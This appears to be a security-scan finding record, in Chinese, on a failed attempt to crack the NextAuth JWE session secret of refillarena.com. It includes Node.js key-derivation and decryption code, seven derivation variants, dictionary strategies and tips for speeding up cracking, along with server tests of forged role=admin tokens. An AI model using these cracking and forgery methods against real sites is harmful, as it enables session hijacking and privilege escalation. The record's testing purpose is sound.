# NextAuth v4 JWE 会话密钥弱字典恢复在 refillarena.com 全阴（约 286 万候选 × 7 种 HKDF 派生变体，零命中）

- **code**: nextauth-v4-jwe-会话密钥弱字典恢复在-refillarena.com-全阴-约-286-万候选-7
- **kind**: script
- **category**: auth-bypass
- **component**: NextAuth.js v4 (next-auth, dir/A256GCM JWE)
- **severity**: low
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-08 在 https://refillarena.com 实测：jwe_crack.js -> "NO HIT. tried=401961 variants=7 cands=57423 ms=7108 control_wrong_secret_decrypted=false"；jwe_crack2.js -> "NO HIT tried=2460222 base=65746 numeric=2000000"；server_control.js -> 合法 token 返回 200 role=user，篡改 1 字符 / 随机密钥伪造 role=admin / 垃圾串均返回 {}。token 取自自注册账号 artex.reg198288@example.com 的有效 __Secure-next-auth.session-token（expires 2026-11-09）。
- **path**: pocs/nextauth-v4-jwe-会话密钥弱字典恢复在-refillarena.com-全阴-约-286-万候选-7/poc.txt
- **tags**: nextauth,jwe,auth-secret,weak-secret,dictionary,negative,next.js
- **created_at**: 2026-11-08T01:32:01.311Z
- **engine**: https://refillarena.com
- **found_by**: vuln-scan

## 描述

目标使用 NextAuth v4 credentials + JWT 会话策略，session cookie 为五段 JWE（dir/A256GCM）。按 HKDF-SHA256(secret, salt=cookie 名, info="NextAuth.js Generated Encryption Key (cookie)") 派生密钥，对真实 role=user token 离线尝试 7 种派生变体（3 种 cookie 名 × info 带/不带括号 + salt=""），候选来自 nextauth 示例默认值、域名/项目名+年份及其大小写/分隔符/符号变体、AUTH_SECRET/NEXTAUTH_SECRET 常见赋值、常见弱口令、双词拼接、stem+4/6 位数字（合计约 286 万次）。全部零命中，判定 AUTH_SECRET 为高熵随机值。服务端侧复核：原始 token → 200 role=user；密文段改 1 字符、随机密钥伪造 role=admin、垃圾串 → 均返回 {} 空会话，证明服务端严格校验 GCM 认证标签。复活条件仅有 AUTH_SECRET 直接泄露（.env/构建产物/主机文件读取/CI 配置）。

## 用法

```
复现脚本在工作目录 D:\ARTEX\data\tasks\634\i12049\：jwe_crack.js（结构化候选 × 7 变体，内置 forge/decrypt 往返自检与错误密钥对照）、jwe_crack2.js（双词拼接 + stem+6 位数字，先主变体后其余变体以控耗时）、server_control.js（服务端接受/拒绝对照）。要点：①派生变体必须同时覆盖 info 带括号（v4.22+）与不带括号、salt=cookie 与 salt=""，否则 secret 弱也会漏判；②用 GCM 认证失败作命中判据无假阳性，但必须跑错误 secret 对照；③先跑主变体再跑其余变体，可把 200 万数字候选压到 1 分钟内。目标变更或新增账号时取一个新 JWE 重跑。
```

## 正文

```
// 核心派生（Node 18+，完整脚本见 jwe_crack.js / jwe_crack2.js）
const crypto = require('crypto');
const ub64u = s => Buffer.from(s, 'base64url');
function key(secret, salt, info) {
  return Buffer.from(crypto.hkdfSync('sha256', Buffer.from(secret,'utf8'), Buffer.from(salt,'utf8'), Buffer.from(info,'utf8'), 32));
}
function decrypt(token, secret, v) {
  const [h,,iv,ct,tag] = token.split('.');
  const d = crypto.createDecipheriv('aes-256-gcm', key(secret, v.salt, v.info), ub64u(iv));
  d.setAAD(Buffer.from(h,'ascii')); d.setAuthTag(ub64u(tag));
  return JSON.parse(Buffer.concat([d.update(ub64u(ct)), d.final()]).toString('utf8'));
}
// 7 variants: cookie 名取 __Secure-next-auth.session-token / next-auth.session-token / __Host-next-auth.session-token
// 每个 cookie 名两种 info：`NextAuth.js Generated Encryption Key (${c})` 与 'NextAuth.js Generated Encryption Key'
// 外加 salt='' + info='NextAuth.js Generated Encryption Key'

```
